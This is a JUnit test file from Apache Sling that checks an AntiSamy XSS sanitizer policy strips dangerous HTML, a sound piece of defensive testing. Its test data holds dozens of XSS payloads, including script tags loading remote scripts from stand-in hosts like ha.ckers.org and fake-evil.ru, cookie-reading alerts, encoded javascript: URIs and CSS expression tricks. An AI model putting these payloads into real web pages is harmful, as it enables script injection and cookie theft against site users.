/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ~ Licensed to the Apache Software Foundation (ASF) under one
 ~ or more contributor license agreements.  See the NOTICE file
 ~ distributed with this work for additional information
 ~ regarding copyright ownership.  The ASF licenses this file
 ~ to you under the Apache License, Version 2.0 (the
 ~ "License"); you may not use this file except in compliance
 ~ with the License.  You may obtain a copy of the License at
 ~
 ~   http://www.apache.org/licenses/LICENSE-2.0
 ~
 ~ Unless required by applicable law or agreed to in writing,
 ~ software distributed under the License is distributed on an
 ~ "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 ~ KIND, either express or implied.  See the License for the
 ~ specific language governing permissions and limitations
 ~ under the License.
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
package org.apache.sling.xss.impl;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import javax.xml.stream.XMLStreamException;

import java.io.IOException;
import java.util.regex.Pattern;

import org.apache.sling.xss.impl.xml.Policy;
import org.apache.commons.lang3.StringUtils;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;


/**
 * This test suite makes sure the customised {@code config.xml} policy shipped with this module is not exposed to attacks. The test strings
 * are adapted from <a href="https://github.com/nahsra/antisamy/blob/master/src/test/java/org/owasp/validator/html/test/AntiSamyTest.java">
 * https://github.com/nahsra/antisamy/blob/master/src/test/java/org/owasp/validator/html/test/AntiSamyTest.java</a>.
 */
public class AntiSamyPolicyTest {

    public static final String POLICY_FILE = "SLING-INF/content/config.xml";
    private static AntiSamyHtmlSanitizer antiSamy;

    @BeforeAll
    public static void setup() throws PolicyException, XMLStreamException, IOException {
        antiSamy = new AntiSamyHtmlSanitizer(Policy.getInstance(AntiSamyPolicyTest.class.getClassLoader().getResourceAsStream(POLICY_FILE)));
    }

    @ParameterizedTest
    @MethodSource("dataForScriptFiltering")
    public void testScriptFiltering(TestInput testInput) throws Exception {
         testInput.runCheck();
    }

    @ParameterizedTest
    @MethodSource("dataForEventHandlerAttributes")
    public void testEventHandlerAttributes(TestInput testInput) throws Exception {
       testInput.runCheck();
    }

    @ParameterizedTest
    @MethodSource("dataForImageFiltering")
    public void testImageFiltering(TestInput testInput) throws Exception {
         testInput.runCheck();
    }

    @ParameterizedTest
    @ValueSource(strings= {
        "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097" +
                "&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
        "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
    })
    public void testEmptyImageFiltering(String input) throws Exception {
        testOutputIsEmpty(input);
    }

    @ParameterizedTest
    @MethodSource("dataForURIFiltering")
    public void testURIFiltering(TestInput testInput) throws Exception {
         testInput.runCheck();
    }

    @ParameterizedTest
    @MethodSource("dataForCSSFiltering")
    public void testCSSFiltering(TestInput testInput) throws Exception {
         testInput.runCheck();
    }

    @ParameterizedTest
    @MethodSource("dataForDataAttributes")
    public void testDataAttributes(TestInput testInput) throws Exception {
         testInput.skipComparingInputWithOutput = false;
         testInput.runCheck();
    }

    /**
     * Test to verify the fix for SLING-8771 - XSS Configuration should allow the HTML5 figure and figcaption tags
     */
    @ParameterizedTest
    @MethodSource("dataForIssueSLING8771")
    public void testIssueSLING8771(TestInput testInput) throws Exception {
         testInput.runCheck();
        }

    private void testOutputIsEmpty(String input) throws Exception {
         String cleanHTML = antiSamy.scan(input);
         assertTrue(StringUtils.isEmpty(cleanHTML), "Expected empty filtered output for '" + input + "'.");
    }

    static TestInput[] dataForScriptFiltering() {
        return new TestInput[]{
                new TestInput("test<script>alert(document.cookie)</script>", "script", false),
                new TestInput("<<<><<script src=http://fake-evil.ru/test.js>", "<script", false),
                new TestInput("<script<script src=http://fake-evil.ru/test.js>>", "<script", false),
                new TestInput("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<script", false),
                new TestInput("<![CDATA[]><script>alert(1)</script><![CDATA[]>]]><script>alert(2)</script>>]]>", "<script", false),
        };
    }

    static TestInput[] dataForEventHandlerAttributes() {
        return new TestInput[]{
                new TestInput("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>", "onblur", false),
                new TestInput("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", "onload", false),
                new TestInput("<BODY ONLOAD=alert('XSS')>", "alert", false),
                new TestInput("<a href=\"http://example.com\"&amp;/onclick=alert(9)>foo</a>", "onclick", false),
                new TestInput("<style onload=alert(1)>h1 {color:red;}</style>", "onload", false),
                new TestInput("<bogus>whatever</bogus><img src=\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\" " +
                        "onmouseover=\"alert('xss')\">", "onmouseover", false),
        };
    }

    static TestInput[] dataForImageFiltering() {
        return new TestInput[]{
                new TestInput("<img src=\"http://www.myspace.com/img.gif\"/>", "<img", true),
                new TestInput("<img src=javascript:alert(document.cookie)>", "<img", false),
                new TestInput(
                        "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
                        "<img", false),
                new TestInput("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", "alert", false),
                new TestInput("<IMG SRC=\"javascript:alert('XSS')\"", "javascript", false),
                new TestInput("<IMG LOWSRC=\"javascript:alert('XSS')\">", "javascript", false),        };
    }

    static TestInput[] dataForURIFiltering() {
        return new TestInput[]{
                new TestInput("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", "src", false),
                new TestInput("<iframe src=http://ha.ckers.org/scriptlet.html <", "<iframe", false),
                new TestInput("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", "href", false),
                new TestInput("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", "href", false),
                new TestInput("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", "ha.ckers.org", false),
                new TestInput("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", "ha.ckers.org", false),
                new TestInput("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", "javascript", false),
                new TestInput("<IMG SRC='vbscript:msgbox(\"XSS\")'>", "vbscript", false),
                new TestInput("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", "<meta", false),
                new TestInput("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", "<meta", false),
                new TestInput(
                        "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
                        "<meta", false),
                new TestInput("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", "<iframe", false),
                new TestInput("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", "javascript", false),
                new TestInput("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", "background", false),
                new TestInput("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", "background", false),
                new TestInput("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", "javascript", false),
                new TestInput("<DIV STYLE=\"width: expression(alert('XSS'));\">", "alert", false),
                new TestInput("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "alert", false),
                new TestInput("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", "ript:alert", false),
                new TestInput("<BASE HREF=\"javascript:alert('XSS');//\">", "javascript", false),
                new TestInput("<BaSe hReF=\"http://arbitrary.com/\">", "<base", false),
                new TestInput("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", "<object", false),
                new TestInput(
                        "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>",
                        "javascript", false),
                new TestInput("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", "<embed", false),
                new TestInput(
                        "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
                        "<embed", false),
                new TestInput("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<script", false),
                new TestInput("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<script", false),
                new TestInput("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<script", false),
                new TestInput("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<script", false),
                new TestInput("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<script",
                        false),
                new TestInput("<SCRIPT SRC=http://ha.ckers.org/xss.js", "<script", false),
                new TestInput(
                        "<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>",
                        Pattern.compile("<div(\\s+style=\"\")?(\\s*/)?>"), true, true),
                new TestInput("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start " +
                        "Menu\\Programs\\Startup\\pwnd.bat'>", "calc.exe", false),
                new TestInput("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", "javascript", false),
                new TestInput(
                        "<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">",
                        "document", false),
                new TestInput("<a href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'>test</a>", "http://subdomain" +
                        ".domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx", true),
                new TestInput("<a href=\"javascript&colon;alert&lpar;1&rpar;\">X</a>", "javascript", false)
        };
    }

    static TestInput[] dataForCSSFiltering() {
        return new TestInput[]{
                new TestInput("<div style=\"position:absolute\">", "position", false),
                new TestInput("<style>b { position:absolute }</style>", "position", false),
                new TestInput("<div style=\"z-index:25\">test</div>", "z-index", false),
                new TestInput("<style>z-index:25</style>", "z-index", false),
                new TestInput("<div style=\"margin: -5em\">Test</div>", "margin", false),
                new TestInput("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", "font-family", true),
                new TestInput("<style type=\"text/css\"><![CDATA[P {\n  font-family: \"Arial Unicode MS\";\n}\n]]></style>",
                        "font-family", true),
                new TestInput("<style type=\"text/css\"><![CDATA[P { margin-bottom: 0.08in; } ]]></style>", "margin-bottom", true),
                new TestInput("<style type=\"text/css\"><![CDATA[\r\nP {\r\n margin-bottom: 0.08in;\r\n}\r\n]]></style>", "margin-bottom",
                        true),
                new TestInput("<style>P {\n\tmargin-bottom: 0.08in;\n}\n", "margin-bottom", true),
                new TestInput("<font color=\"#fff\">Test</font>", "color=\"#fff\"", true),
                new TestInput("<font color=\"red\">Test</font>", "color=\"red\"", true),
                new TestInput("<font color=\"neonpink\">Test</font>", "color", false),
                new TestInput("<font color=\"#0000\">Test</font>", "color=", false),
                new TestInput("<font color=\"#000000\">Test</font>", "color=\"#000000\"", true),
                new TestInput("<div style=\"color: #fff\">Test 3 letter code</div>", "color: rgb(255,255,255)", true, true),
                new TestInput("<div style=\"color: #000000\">Test</div>", "color: rgb(0,0,0)", true, true),
                new TestInput("<div style=\"color: #0000\">Test</div>", "style=\"\"", true, true),
        };
    }

    static TestInput[] dataForDataAttributes() {
        return new TestInput[]{
                new TestInput("<p data-tag=\"abc123\">Hello World!</p>", "data-tag", true),
                new TestInput("<p dat-tag=\"abc123\">Hello World!</p>", "dat-tag", false),
        };
    }

    static TestInput[] dataForIssueSLING8771() {
        return new TestInput[]{
                new TestInput("<figure class=\"image\"><img src=\"/logo.jpg\"><figcaption>Caption Here</figcaption></figure>",
                        "<figure", true),
                new TestInput("<figure class=\"image\"><img src=\"/logo.jpg\"><figcaption>Caption Here</figcaption></figure>",
                        "<figcaption", true),
        };
    }

    private static class TestInput {
        String input;
        String expectedPartialOutput;
        boolean containsExpectedPartialOutput;
        boolean skipComparingInputWithOutput;
        Pattern pattern;


        public TestInput(String input, String expectedPartialOutput, boolean containsExpectedPartialOutput) {
            this(input, expectedPartialOutput, containsExpectedPartialOutput, false);
        }

        public TestInput(String input, String expectedPartialOutput, boolean containsExpectedPartialOutput, boolean skipComparingInputWithOutput) {
            this.input = input;
            this.expectedPartialOutput = expectedPartialOutput;
            this.containsExpectedPartialOutput = containsExpectedPartialOutput;
            this.skipComparingInputWithOutput = skipComparingInputWithOutput;
        }
 
         public TestInput(String input, Pattern expectedPartialPattern, boolean containsExpectedPartialOutput, boolean skipComparingInputWithOutput) {
             this.input = input;
             this.pattern = expectedPartialPattern;
             this.containsExpectedPartialOutput = containsExpectedPartialOutput;
             this.skipComparingInputWithOutput = skipComparingInputWithOutput;
         }
 
         void runCheck() throws Exception {
               String cleanHTML = antiSamy.scan(input);
               if (!skipComparingInputWithOutput) {
                       if (pattern != null) {
                               assertTrue(pattern.matcher(input.toLowerCase()).find(), String.format(
                                               "Test is not properly configured: input '%s' doesn't seem to partialy matcht to following pattern:'%s' (case-insensitive match).",
                                               input, expectedPartialOutput.toString()));
                       } else {
                               assertTrue(input.toLowerCase().contains(expectedPartialOutput.toLowerCase()), String.format(
                                               "Test is not properly configured: input '%s' doesn't seem to contain '%s' (case-insensitive match).",
                                               input, expectedPartialOutput));
                       }
               }
               if (containsExpectedPartialOutput) {
                       if (pattern != null) {
                               assertTrue(
                                               pattern.matcher(antiSamy.scan(input)).find(),
                                               String.format("Expected that filtered output '%s' for input '%s' would partialy match to following pattern: '%s'.",
                                                               cleanHTML,
                                                               input,
                                                               expectedPartialOutput));
                       } else {
                               assertTrue(
                                               antiSamy.scan(input).contains(expectedPartialOutput),
                                               String.format("Expected that filtered output '%s' for input '%s' would contain '%s'.",
                                                               cleanHTML,
                                                               input,
                                                               expectedPartialOutput));
                       }
               } else {
                       if (pattern != null) {
                               assertFalse(pattern.matcher(antiSamy.scan(input)).find(),
                                               String.format("Expected that filtered output '%s' for input '%s', would NOT partialy match to following pattern:: '%s'.",
                                                               cleanHTML,
                                                               input, expectedPartialOutput));
                       } else {
                               assertFalse(antiSamy.scan(input).contains(expectedPartialOutput),
                                               String.format("Expected that filtered output '%s' for input '%s', would NOT contain '%s'.",
                                                               cleanHTML,
                                                               input, expectedPartialOutput));
                       }
               }
       }
    }
}